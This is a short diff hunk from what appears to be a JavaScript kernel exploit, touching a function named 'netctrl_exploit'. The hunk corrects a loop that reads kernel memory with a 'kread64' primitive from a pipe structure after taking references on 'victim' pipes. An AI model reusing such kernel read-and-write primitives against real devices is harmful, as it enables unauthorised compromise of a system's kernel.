@@ -971,8 +971,8 @@ function netctrl_exploit() {
     fhold(fget(victim_pipe[0]));
     fhold(fget(victim_pipe[1]));
 
-    for(i=0; i<=0x20; i=i+8) {
-        var read = kread64(masterRpipeData.add(i))
+    for(var i=0; i<0x20; i=i+8) {
+        var read = kread64(masterRpipeData.add(i));
         debug("Reading masterRpipeData[" + i + "] : " + hex(read) );
     }
 
